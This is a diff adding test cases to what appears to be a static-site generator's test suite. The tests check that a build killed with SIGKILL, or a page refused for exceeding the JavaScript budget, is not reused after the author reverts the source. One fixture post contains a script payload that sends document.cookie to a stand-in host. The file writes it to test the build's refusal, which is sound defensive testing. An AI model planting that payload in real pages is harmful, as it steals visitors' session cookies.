@@ -2515,3 +2515,58 @@ describe("the client budget (H2): the build weighs the page it wrote, on the sit
     expect(await refusal()).toContain("declared by nothing");
   });
 });
+
+describe("build generations (H3): a build that did not finish is not a build the next one believes", () => {
+  const root = "corpora/_test/generations";
+  const dist = join(root, "dist");
+  const kill = resolve(root, "KILL");
+  const config = (extra = "") => writeFileSync(join(root, "snypd.yaml"), `snypd: 1\nsite: { name: G, url: https://g.example }\ntheme: { use: base }\nplugins: [killer]\n${extra}`);
+  const post = (slug: string, date: string, body: string) => writeFileSync(join(root, `content/posts/${slug}.md`), `---\ntitle: ${slug.toUpperCase()}\ndate: ${date}\nstatus: published\n---\n\n${body}\n`);
+  const page = (slug: string) => readFileSync(join(dist, `posts/${slug}/index.html`), "utf8");
+  beforeAll(() => {
+    rmSync(root, { recursive: true, force: true });
+    for (const d of ["content/posts", "plugins/killer"]) mkdirSync(join(root, d), { recursive: true });
+    // A slot that ends the process, uncatchably, while page b renders — and only while the file says to.
+    writeFileSync(join(root, "plugins/killer/end.ts"), `import { existsSync } from "node:fs";\nexport default ({ route }: { route: string }) => { if (route === "/posts/b" && existsSync(${JSON.stringify(kill)})) process.kill(process.pid, "SIGKILL"); return null; };\n`);
+    writeFileSync(join(root, "plugins/killer/snypd.yaml"), "plugin: { name: killer, version: 0.0.1, api: 1, slots: { body-end: ./end.ts } }\n");
+    config();
+  });
+  afterAll(() => rmSync(root, { recursive: true, force: true }));
+
+  test("finding 8: a build killed after writing a page, then a revert of the source — the next build writes the reverted page, not the killed build's", async () => {
+    rmSync(kill, { force: true });
+    post("a", "2026-09-02", "The first words.");
+    post("b", "2026-09-01", "B stays as it is.");
+    expect((await build(root)).recovered).toBe(0);
+    expect(page("a")).toContain("The first words.");
+    // The edit, and a build that dies part-way: newest first, so a is written and then b takes the process down.
+    post("a", "2026-09-02", "The second words, which were never finished building.");
+    post("b", "2026-09-01", "B changes too, or the route cache would never render it and nothing would die.");
+    writeFileSync(kill, "");
+    const child = Bun.spawn([process.execPath, "-e", `const { build } = await import(${JSON.stringify(resolve("packages/render/src/index.ts"))}); await build(${JSON.stringify(root)});`], { stdout: "ignore", stderr: "ignore" });
+    await child.exited;
+    expect(child.signalCode).toBe("SIGKILL");
+    expect(page("a")).toContain("The second words");   // the interrupted build did write it — so the case is real
+    rmSync(kill);
+    // The author reverts. The source's hash is the first build's again, and so is page a's key.
+    post("a", "2026-09-02", "The first words.");
+    const r = await build(root);
+    expect(page("a")).toContain("The first words.");
+    expect(page("a")).not.toContain("The second words");
+    expect(r.recovered).toBeGreaterThan(0);
+    // …and once a build has finished, nothing is left open.
+    expect((await build(root)).recovered).toBe(0);
+  });
+
+  test("the same hole without a kill: a page the client budget refused is not served by the next build after a revert (H2 × H3)", async () => {
+    post("a", "2026-09-02", "Plain words.");
+    expect((await build(root)).rendered).toBeGreaterThanOrEqual(0);
+    expect(page("a")).toContain("Plain words.");
+    post("a", "2026-09-02", "<script>fetch('https://x.example/?c='+document.cookie)</script>");
+    await expect(build(root)).rejects.toThrow("more JavaScript than this site afforded");
+    post("a", "2026-09-02", "Plain words.");
+    const r = await build(root);
+    expect(page("a")).not.toContain("<script>fetch");
+    expect(r.recovered).toBeGreaterThan(0);
+  });
+});
